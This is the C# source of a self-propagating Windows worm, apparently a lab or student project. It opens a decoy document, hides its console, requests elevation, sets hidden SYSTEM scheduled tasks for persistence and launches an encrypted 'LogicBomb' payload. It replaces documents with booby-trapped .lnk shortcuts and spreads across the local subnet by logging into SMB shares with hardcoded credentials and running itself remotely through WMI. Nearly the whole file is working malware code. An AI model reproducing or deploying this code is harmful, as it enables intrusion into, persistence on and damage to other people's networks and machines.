using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using SharedCrypto;
using IWshRuntimeLibrary;

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
    private const string KEY_FILE_NAME = "key.dat";
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "Malicious_Worm";
    private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";
    private static string logFilePath;

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;

    static async Task Main(string[] args)
    {
        // 1. DEBUG LOG & MỞ FILE MỒI (DECOY) - PHẢI CHẠY TRƯỚC KHI ẨN CONSOLE VÀ NÂNG QUYỀN
        string debugLog = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECOY_DEBUG.txt");
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;

        try
        {
            System.IO.File.AppendAllText(debugLog, $"\n=== {DateTime.Now:HH:mm:ss} ===\n");
            System.IO.File.AppendAllText(debugLog, $"Machine: {Environment.MachineName}\n");
            System.IO.File.AppendAllText(debugLog, $"User: {Environment.UserName}\n");
            System.IO.File.AppendAllText(debugLog, $"Args: [{string.Join(", ", args)}]\n");
        }
        catch { }

        if (args.Length > 0)
        {
            try
            {
                string fileName = args[0].Trim('\"');
                string targetDoc = Path.Combine(baseDir, fileName);

                if (System.IO.File.Exists(targetDoc))
                {
                    System.IO.File.AppendAllText(debugLog, $"SUCCESS: Opening Decoy -> {targetDoc}\n");
                    Process.Start(new ProcessStartInfo(targetDoc)
                    {
                        UseShellExecute = true,
                        WorkingDirectory = baseDir
                    });
                }
                else { System.IO.File.AppendAllText(debugLog, $"FAILED: File not found -> {targetDoc}\n"); }
            }
            catch (Exception ex) { System.IO.File.AppendAllText(debugLog, $"ERROR: {ex.Message}\n"); }
        }

        // Ẩn cửa sổ Console
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        Directory.SetCurrentDirectory(baseDir);
        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
        logFilePath = Path.Combine(baseDir, $"Worm_log_{timestamp}.log");

        // 2. ADMIN CHECK & ESCALATION
        if (!IsAdministrator())
        {
            LogWarning("Not running as admin, attempting elevation...");
            try
            {
                ProcessStartInfo proc = new ProcessStartInfo();
                proc.UseShellExecute = true;
                proc.WorkingDirectory = baseDir;
                proc.FileName = Process.GetCurrentProcess().MainModule.FileName;
                proc.Verb = "runas";

                // Chỉ truyền lại args nếu cần, nhưng file mồi đã mở ở trên rồi nên không cần thiết
                Process.Start(proc);
                Environment.Exit(0);
            }
            catch { LogError("UAC Elevation denied by user."); }
        }

        await RunMalwarePayload(baseDir);
    }

    private static async Task RunMalwarePayload(string baseDir)
    {
        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Privileges: {(IsAdministrator() ? "ADMIN" : "USER")}");
        LogToFile($"Running from: {baseDir}");
        LogToFile("========================================");

        try
        {
            LogInfo("[STEP 0] Applying file attributes (Hidden/System)...");
            HideMalwareFiles(baseDir);

            LogInfo("[STEP 1] Staging disposable payload...");
            string duplicateBombPath = CreateDuplicatePayload(baseDir);

            LogInfo("[STEP 2] Attempting to install persistence...");
            if (IsAdministrator())
            {
                InstallPersistence(duplicateBombPath);
            }
            else { LogWarning("Skipping persistence - requires Admin privileges."); }

            LogInfo("[STEP 3] Executing LogicBomb...");
            if (!string.IsNullOrEmpty(duplicateBombPath))
            {
                RunLogicBomb(duplicateBombPath);
            }

            LogInfo("[STEP 4] Starting main loop (Infection & Propagation)...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    private static void InfectCurrentDirectoryWithLNKs()
    {
        LogInfo("Scanning for files to create LNK traps...");
        try
        {
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Path.Combine(currentDir, WORM_EXE_NAME);
            string[] targetExtensions = { ".docx", ".xlsx", ".pptx", ".pdf", ".txt" };

            var filesToInfect = Directory.GetFiles(currentDir)
                .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
                             !Path.GetFileName(f).Equals(WORM_EXE_NAME, StringComparison.OrdinalIgnoreCase) &&
                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase))
                .ToList();

            int infectedCount = 0;
            int skippedCount = 0;

            foreach (string filePath in filesToInfect)
            {
                string fileName = Path.GetFileName(filePath);
                string lnkPath = filePath + ".lnk";

                if (System.IO.File.Exists(lnkPath))
                {
                    skippedCount++;
                    continue;
                }

                // Ẩn file gốc
                System.IO.File.SetAttributes(filePath, FileAttributes.Hidden | FileAttributes.System);

                // Tạo Shortcut Trap
                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);

                shortcut.TargetPath = wormPath;
                shortcut.Arguments = $"\"{fileName}\""; // Quan trọng: Chỉ truyền tên file
                shortcut.IconLocation = filePath + ",0";
                shortcut.WorkingDirectory = ""; // Fix lỗi Client SMB
                shortcut.WindowStyle = 7; // Minimized
                shortcut.Save();

                infectedCount++;
            }
            LogSuccess($"LNK Summary: {infectedCount} created, {skippedCount} skipped.");
        }
        catch (Exception ex) { LogWarning($"LNK error: {ex.Message}"); }
    }

    // --- CÁC HÀM CƠ CHẾ LOG CŨ CỦA BẠN ĐƯỢC GIỮ NGUYÊN ---

    private static bool IsAdministrator()
    {
        try { return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator); }
        catch { return false; }
    }

    private static string CreateDuplicatePayload(string baseDir)
    {
        try
        {
            string originalPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
            if (!Directory.Exists(originalPath)) { LogWarning("Original payload folder not found."); return null; }

            string duplicatePath = Path.Combine(baseDir, $"{PAYLOAD_FOLDER_NAME}_{new Random().Next(1000, 9999)}");
            LogInfo($"Copying payload to: {duplicatePath}");
            CopyFolderSync(originalPath, duplicatePath);
            LogSuccess("Payload duplicated successfully.");
            return Path.Combine(duplicatePath, LOGICBOMB_EXE_NAME);
        }
        catch (Exception ex) { LogError($"Duplication failed: {ex.Message}"); return null; }
    }

    private static void InstallPersistence(string duplicateLogicBombPath)
    {
        try
        {
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            if (CreateScheduledTask(WORM_TASK_NAME, wormPath)) LogSuccess("Worm task created.");

            if (!string.IsNullOrEmpty(duplicateLogicBombPath))
            {
                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, duplicateLogicBombPath))
                    LogSuccess($"LogicBomb task created: {duplicateLogicBombPath}");
            }
        }
        catch (Exception ex) { LogError($"Persistence failed: {ex.Message}"); }
    }

    private static void RunLogicBomb(string logicBombPath)
    {
        try
        {
            Process.Start(new ProcessStartInfo(logicBombPath) { CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden, WorkingDirectory = Path.GetDirectoryName(logicBombPath) });
            LogSuccess("LogicBomb process started.");
        }
        catch (Exception ex) { LogError($"Failed to run LogicBomb: {ex.Message}"); }
    }

    private static void HideMalwareFiles(string directory)
    {
        string[] hideList = { WORM_EXE_NAME, SHARED_CRYPTO_DLL, PAYLOAD_FOLDER_NAME };
        foreach (var item in hideList)
        {
            string path = Path.Combine(directory, item);
            if (System.IO.File.Exists(path) || Directory.Exists(path))
                try { System.IO.File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System); } catch { }
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            Process.Start(new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F") { CreateNoWindow = true, UseShellExecute = false })?.WaitForExit();
            var psi = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            { CreateNoWindow = true, UseShellExecute = false, RedirectStandardError = true };
            var p = Process.Start(psi);
            p?.WaitForExit();
            return p?.ExitCode == 0;
        }
        catch { return false; }
    }

    private static async Task ContinuousScanLoop()
    {
        int count = 0;
        while (true)
        {
            count++;
            LogInfo($"--- Scan Loop #{count} ---");
            InfectCurrentDirectoryWithLNKs();
            string localIP = GetLocalIPAddress();
            if (!string.IsNullOrEmpty(localIP))
            {
                string baseIP = string.Join(".", localIP.Split('.').Take(3));
                LogInfo($"Local IP: {localIP}, Scanning: {baseIP}.1-254");
                var smbHosts = await FindSmbServersAsync(baseIP);
                LogSuccess($"Found {smbHosts.Count} SMB hosts.");
                foreach (string ip in smbHosts) await ProcessTargetHost(ip);
            }
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static async Task ProcessTargetHost(string ip)
    {
        LogInfo($"Processing target: {ip}");
        if (IsWormAlreadyRunningOnTarget(ip)) { LogInfo("Worm already on target, skipping."); return; }

        string remoteShare = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        int connectResult = ConnectToRemoteShare(remoteShare, SMB_USERNAME, SMB_PASSWORD);

        if (connectResult == 0)
        {
            LogSuccess($"Connected to SMB on {ip}");
            try
            {
                string localTemp = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
                PrepareVictimSpecificPackage(localTemp);
                await CopyFolderAsync(localTemp, remoteShare);
                LogSuccess($"Package copied to {ip}");

                string remoteExe = $@"C:\{SMB_SHARE_NAME}\{WORM_EXE_NAME}";
                if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteExe))
                    LogSuccess($"WMI Execution success on {ip}");
            }
            catch (Exception ex) { LogError($"Target processing error: {ex.Message}"); }
            finally { DisconnectFromRemoteShare(remoteShare); }
        }
        else { LogWarning($"Failed SMB connect to {ip} (Code: {connectResult})"); }
    }

    private static void PrepareVictimSpecificPackage(string tempPackagePath)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        Directory.CreateDirectory(tempPackagePath);
        string tempPayload = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
        Directory.CreateDirectory(tempPayload);

        System.IO.File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
        System.IO.File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));
        CopyFolderSync(Path.Combine(baseDir, PAYLOAD_FOLDER_NAME), tempPayload);

        string keyPath = Path.Combine(tempPayload, KEY_FILE_NAME);
        string oldKey = System.IO.File.ReadAllText(keyPath);
        string newKey = CryptoUtils.GenerateRandomKey();
        string bombEnc = Path.Combine(tempPayload, ENCRYPTED_BOMB_NAME);
        string tempTroj = Path.Combine(tempPackagePath, "temp.exe");

        CryptoUtils.DecryptFile(bombEnc, tempTroj, oldKey);
        CryptoUtils.EncryptFile(tempTroj, bombEnc, newKey);
        System.IO.File.WriteAllText(keyPath, newKey);
        System.IO.File.Delete(tempTroj);
    }

    // --- CÁC HÀM TIỆN ÍCH SMB/WMI ---

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(5) });
            scope.Connect();
            return new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name = '{WORM_EXE_NAME}'")).Get().Count > 0;
        }
        catch { return false; }
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var hosts = new List<string>();
        var sem = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            string ip = $"{baseIP}.{i}";
            await sem.WaitAsync();
            try
            {
                using (var ping = new Ping())
                {
                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                    {
                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                        {
                            lock (hosts) hosts.Add(ip);
                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                        }
                    }
                }
            }
            catch { }
            finally { sem.Release(); }
        });
        await Task.WhenAll(tasks);
        return hosts;
    }

    private static string GetLocalIPAddress()
    {
        return NetworkInterface.GetAllNetworkInterfaces()
            .Where(ni => ni.OperationalStatus == OperationalStatus.Up)
            .SelectMany(ni => ni.GetIPProperties().UnicastAddresses)
            .FirstOrDefault(ip => ip.Address.AddressFamily == AddressFamily.InterNetwork)?.Address.ToString();
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string user, string pass, string cmd)
    {
        try
        {
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", new ConnectionOptions { Username = user, Password = pass, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(15) });
            scope.Connect();
            using (var mc = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = mc.GetMethodParameters("Create");
                inParams["CommandLine"] = cmd;
                return Convert.ToInt32(mc.InvokeMethod("Create", inParams, null)["returnValue"]) == 0;
            }
        }
        catch { return false; }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string f in Directory.GetFiles(source)) System.IO.File.Copy(f, Path.Combine(dest, Path.GetFileName(f)), true);
        foreach (string d in Directory.GetDirectories(source)) CopyFolderSync(d, Path.Combine(dest, Path.GetFileName(d)));
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var files = Directory.GetFiles(source).Select(f => Task.Run(() => System.IO.File.Copy(f, Path.Combine(dest, Path.GetFileName(f)), true)));
        var dirs = Directory.GetDirectories(source).Select(d => CopyFolderAsync(d, Path.Combine(dest, Path.GetFileName(d))));
        await Task.WhenAll(files.Concat(dirs));
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE nr, string pass, string user, int flags);
    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string path, string user, string pass)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = path };
        return WNetAddConnection2(ref nr, pass, user, 0);
    }
    private static void DisconnectFromRemoteShare(string path) { try { WNetCancelConnection2(path, 0, true); } catch { } }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE { public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage; public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider; }

    // --- HÀM LOG CHI TIẾT ---
    private static void LogToFile(string msg) { try { System.IO.File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {msg}{Environment.NewLine}"); } catch { } }
    private static void LogInfo(string m) { Console.ForegroundColor = ConsoleColor.Cyan; Console.WriteLine("[INFO] " + m); Console.ResetColor(); LogToFile("[INFO] " + m); }
    private static void LogSuccess(string m) { Console.ForegroundColor = ConsoleColor.Green; Console.WriteLine("[SUCCESS] " + m); Console.ResetColor(); LogToFile("[SUCCESS] " + m); }
    private static void LogWarning(string m) { Console.ForegroundColor = ConsoleColor.Yellow; Console.WriteLine("[WARNING] " + m); Console.ResetColor(); LogToFile("[WARNING] " + m); }
    private static void LogError(string m) { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine("[ERROR] " + m); Console.ResetColor(); LogToFile("[ERROR] " + m); }
}